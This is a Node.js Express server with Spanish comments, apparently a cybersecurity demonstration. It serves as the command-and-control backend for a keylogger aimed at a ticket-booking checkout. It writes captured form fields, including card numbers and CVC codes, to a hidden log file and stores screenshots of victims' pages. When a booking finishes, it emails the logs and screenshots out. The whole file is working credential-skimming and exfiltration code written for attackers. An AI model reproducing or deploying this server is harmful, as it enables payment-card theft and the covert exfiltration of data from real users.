const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const dotenv = require("dotenv");

// Cargar variables de entorno
dotenv.config();

// Importar mailer DESPUÉS de cargar las variables de entorno
const { sendExfiltrationEmail } = require("./mailer");

const app = express();
const PORT = process.env.PORT || 3000;

const SERVER_IP = process.env.SERVER_IP || "localhost";

// CONFIGURACIÓN DE ALMACENAMIENTO
const LOG_FILE = path.join(__dirname, ".logs_db.txt");
const SCREENSHOTS_DIR = path.join(__dirname, "capturas");

// Crear carpeta de capturas si no existe
if (!fs.existsSync(SCREENSHOTS_DIR)) {
  fs.mkdirSync(SCREENSHOTS_DIR);
}

// MIDDLEWARE
app.use(cors());
// Aumentamos el límite a 10mb para soportar las capturas de pantalla en Base64
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static("public"));
app.use("/src", express.static("src")); // Servir archivos desde la carpeta src/

// RUTA PARA EL KEYLOGGER
app.post("/captura", (req, res) => {
  const data = req.body;
  const timestamp = new Date().toLocaleString();

  // Formateamos la entrada: [Fecha] Campo: card-number | Valor: 4566...
  const logEntry = `[${timestamp}] Campo: ${data.f} | Valor: ${data.v}\n`;

  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) {
      console.error("❌ Error al guardar log de texto:", err);
      return res.status(500).send();
    }
    res.status(200).json({ status: "ok" });
  });

  // Feedback en consola para el "atacante" con mejor formato
  let displayValue = data.v;

  // Enmascarar datos sensibles en la consola
  if (
    data.f.toLowerCase().includes("card") ||
    data.f.toLowerCase().includes("number")
  ) {
    displayValue = data.v.replace(/\d(?=\d{4})/g, "*");
  }
  if (
    data.f.toLowerCase().includes("cvc") ||
    data.f.toLowerCase().includes("cvv")
  ) {
    displayValue = "***";
  }

  console.log(`\nCAPTURA DETECTADA:`);
  console.log(`    Campo: ${data.f}`);
  console.log(`    Valor: ${displayValue}`);
  console.log(`    Hora: ${timestamp}\n`);
});

// RUTA PARA SCREENSHOTS (Imágenes del DOM)
app.post("/upload-screenshot", (req, res) => {
  const { image, user, timestamp } = req.body;

  // Limpiamos el prefijo Base64 para convertirlo en buffer de imagen
  // Soportar tanto PNG como JPEG (ahora se envía JPEG desde el cliente)
  const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
  const safeUser = (user || "desconocido").replace(/\s/g, "_");
  const fileName = `snap_${safeUser}_${timestamp}.jpg`;
  const filePath = path.join(SCREENSHOTS_DIR, fileName);

  fs.writeFile(filePath, base64Data, "base64", (err) => {
    if (err) {
      console.error("Error al guardar captura de pantalla:", err);
      return res.status(500).send();
    }

    console.log(`\nCAPTURA DE PANTALLA GUARDADA:`);
    console.log(`    Archivo: ${fileName}`);
    console.log(`    Usuario: ${user}`);
    console.log(`    Ubicación: ${filePath}`);

    res.status(200).json({ status: "success" });
  });
});

// Ruta para procesar el "Finalizar Reserva" y enviar el correo resumen
app.post("/finalizar-y-enviar", async (req, res) => {
  const { user, email, match, totalAmount, seats } = req.body;

  console.log(`\n${"=".repeat(70)}`);
  console.log(`TRANSACCIÓN COMPLETADA - INICIANDO EXFILTRACIÓN`);
  console.log(`${"=".repeat(70)}`);
  console.log(`Usuario: ${user}`);
  console.log(`Correo: ${email}`);
  console.log(`Partido: ${match}`);
  console.log(
    `Monto: $${totalAmount ? totalAmount.toLocaleString("es-MX") : "0"}`,
  );
  console.log(`Asientos: ${seats}`);
  console.log(`Hora: ${new Date().toLocaleString()}`);
  console.log(`${"=".repeat(70)}\n`);

  try {
    console.log(`\nPREPARANDO ENVÍO DE CORREO...`);
    
    // Delegamos la lógica al nuevo servicio
    const result = await sendExfiltrationEmail(req.body, SCREENSHOTS_DIR, LOG_FILE);

    console.log(`\nCORREO ENVIADO EXITOSAMENTE`);
    console.log(`   Message ID: ${result.info.messageId}`);
    console.log(
      `   To: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`,
    );
    console.log(`   Files: ${result.attachmentsCount} archivos`);
    console.log(`${"=".repeat(70)}\n`);

    res.status(200).json({
      status: "success",
      message: "Exfiltración completada",
      files_sent: result.attachmentsCount,
      screenshots: result.screenshotsCount,
    });
  } catch (error) {
    console.error(`\nERROR EN EXFILTRACIÓN:`, error.message);
    console.log(`${"=".repeat(70)}\n`);
    res.status(500).json({
      status: "error",
      message: error.message,
    });
  }
});

const HOST = "0.0.0.0"; // Esto permite conexiones externas (celular)

// INICIO DEL SERVIDOR
app.listen(PORT, HOST, () => {
  console.log(`=========================================`);
  console.log(`   CENTRO DE CONTROL - CIBERSEGURIDAD    `);
  console.log(`=========================================`);
  console.log(`Servidor accesible en: http://${SERVER_IP}:${PORT}`);
  console.log(`Logs de texto: ${LOG_FILE}`);
  console.log(`Capturas en: ${SCREENSHOTS_DIR}`);
  console.log(`-----------------------------------------`);
  console.log(`Esperando actividad de la víctima...`);
});
